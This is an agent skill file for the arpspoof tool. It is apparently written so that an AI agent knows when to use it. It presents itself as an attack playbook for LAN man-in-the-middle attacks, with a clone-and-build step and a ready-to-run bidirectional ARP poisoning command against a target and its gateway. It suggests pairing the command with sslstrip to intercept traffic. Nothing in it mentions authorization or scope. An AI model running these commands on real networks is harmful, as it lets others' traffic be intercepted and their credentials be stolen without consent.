---
name: arpspoof-smikims
description: "arpspoof: poisons ARP on the LAN. Signals: man-in-the-middle, mitm, bidirectional ARP spoofing, target+gateway"
zh-signals: "arpspoof: 局域网 ARP 毒化。信号:中间人,mitm,双向 ARP 欺骗,目标+网关。"
when-to-use: "Use arpspoof when performing a LAN man-in-the-middle attack and you need bidirectional ARP poisoning between a target and its gateway, e.g., to feed traffic into sslstrip or Wireshark."
---

# arpspoof

- Attack Category: C40 Sniffing and Man-in-the-Middle Attacks
- Upstream Repository: https://github.com/smikims/arpspoof
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/smikims/arpspoof && make
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `./arpspoof -i eth0 -t 10.0.0.5 -r 10.0.0.1` | Bidirectional ARP spoofing |
| `-t target -r gateway` | Target + gateway |

## Attack Scenario Playbook

### LAN ARP Poisoning

```bash
./arpspoof -i eth0 -t 10.0.0.5 -r 10.0.0.1
# Works with sslstrip/wireshark
```

## Notes

A minimal ARP spoofing tool from the dsniff family.
